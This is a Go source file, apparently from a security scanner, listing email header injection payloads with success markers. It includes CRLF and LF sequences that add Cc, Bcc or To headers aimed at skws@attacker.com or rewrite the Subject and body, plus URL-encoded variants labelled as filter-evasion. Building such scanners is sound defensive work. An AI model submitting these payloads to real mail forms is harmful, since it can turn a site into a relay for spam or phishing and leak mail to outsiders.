package emailinj

// Payload represents an email header injection payload.
type Payload struct {
	Value       string
	Marker      string // String to search for in response indicating injection
	Description string
	WAFBypass   bool
}

// GetPayloads returns standard email header injection payloads.
func GetPayloads() []Payload {
	return standardPayloads
}

// GetWAFBypassPayloads returns payloads designed to evade WAF filtering.
func GetWAFBypassPayloads() []Payload {
	return wafBypassPayloads
}

// GetAllPayloads returns all email header injection payloads including WAF bypass variants.
func GetAllPayloads() []Payload {
	all := make([]Payload, 0, len(standardPayloads)+len(wafBypassPayloads))
	all = append(all, standardPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// Standard email header injection payloads.
// Source: OWASP WSTG-INPV-10, PayloadsAllTheThings
var standardPayloads = []Payload{
	{
		Value:       "test@example.com\r\nCc: skws@attacker.com",
		Marker:      "Cc:",
		Description: "CRLF injection to add Cc header",
	},
	{
		Value:       "test@example.com\r\nBcc: skws@attacker.com",
		Marker:      "Bcc:",
		Description: "CRLF injection to add Bcc header",
	},
	{
		Value:       "test@example.com\r\nTo: skws@attacker.com",
		Marker:      "To:",
		Description: "CRLF injection to add To header",
	},
	{
		Value:       "test@example.com\r\nSubject: skws_injected",
		Marker:      "skws_injected",
		Description: "CRLF injection to override Subject header",
	},
	{
		Value:       "test@example.com\nCc: skws@attacker.com",
		Marker:      "Cc:",
		Description: "LF-only injection to add Cc header",
	},
	{
		Value:       "test@example.com\nBcc: skws@attacker.com",
		Marker:      "Bcc:",
		Description: "LF-only injection to add Bcc header",
	},
	{
		Value:       "test@example.com\r\nCc: skws@attacker.com\r\nBcc: skws2@attacker.com",
		Marker:      "Bcc:",
		Description: "CRLF injection with multiple headers",
	},
	{
		Value:       "test@example.com\r\n\r\nInjected body content",
		Marker:      "Injected body content",
		Description: "CRLF injection to inject email body",
	},
	{
		Value:       "test@example.com\r\nContent-Type: text/html\r\n\r\n<h1>skws</h1>",
		Marker:      "Content-Type:",
		Description: "CRLF injection to change Content-Type and inject HTML body",
	},
	{
		Value:       "test@example.com\r\nX-Injected: skws_header",
		Marker:      "skws_header",
		Description: "CRLF injection to add custom X-header",
	},
}

// WAF bypass email header injection payloads.
// Source: PayloadsAllTheThings, HackTricks
var wafBypassPayloads = []Payload{
	{
		Value:       "test@example.com%0d%0aCc:%20skws@attacker.com",
		Marker:      "Cc:",
		Description: "URL-encoded CRLF injection for Cc",
		WAFBypass:   true,
	},
	{
		Value:       "test@example.com%0aBcc:%20skws@attacker.com",
		Marker:      "Bcc:",
		Description: "URL-encoded LF injection for Bcc",
		WAFBypass:   true,
	},
	{
		Value:       "test@example.com%0d%0aTo:%20skws@attacker.com",
		Marker:      "To:",
		Description: "URL-encoded CRLF injection for To",
		WAFBypass:   true,
	},
	{
		Value:       "test@example.com\r\n Cc: skws@attacker.com",
		Marker:      "Cc:",
		Description: "CRLF with leading space (header continuation) bypass",
		WAFBypass:   true,
	},
}
